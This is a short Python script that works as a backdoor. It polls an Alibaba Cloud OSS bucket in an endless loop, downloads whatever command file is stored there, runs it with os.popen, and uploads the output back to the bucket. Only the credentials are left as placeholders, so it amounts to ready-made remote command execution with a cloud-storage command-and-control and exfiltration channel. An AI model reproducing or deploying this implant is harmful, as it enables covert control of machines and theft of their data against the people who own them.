# -*- coding: utf-8 -*-
# qfmy

import os
import oss2
import time

def ossConfig(ossurl,BucketName,AccessKeyId,AccessKeySecret):

	''' api config of aliyun oss '''
	
	ossurl = ossurl
	BucketName = BucketName
	auth = oss2.Auth(AccessKeyId, AccessKeySecret)
	bucket = oss2.Bucket(auth, ossurl, BucketName)
	return bucket


def loadPayload(ossconfigObj,oss_command_file):

	''' send payload to local in oss and execute '''
	
	download_local_file = str(id(time.ctime))
	ossconfigObj.get_object_to_file(oss_command_file, download_local_file)
	ossPayload = open(download_local_file).read()
	
	try:
		data = os.popen(ossPayload).read()
	finally:
		os.remove(download_local_file)

	data = ">>>: {0}\n{1}".format(ossPayload,str(data))
	return data


def putPayload(ossconfigObj,execute_result_file):

	''' put execute results to oss '''

	data = loadPayload(ossconfigObj,oss_command_file="oss_command_file.txt")
	ossconfigObj.put_object(execute_result_file,data)


def main():

	''' main '''

	timeSleep = time.sleep(5)
	ossconfig = ossConfig(ossurl="<your ossurl>",BucketName="<your BucketName>",AccessKeyId="<your AccessKeyId>",AccessKeySecret="<your AccessKeySecret>")
	# loadPayload(ossconfig,oss_command_file="oss_command_file.txt")
	putPayload(ossconfig,execute_result_file="execute_result.txt")

if __name__ == "__main__":
	while True:
		main()
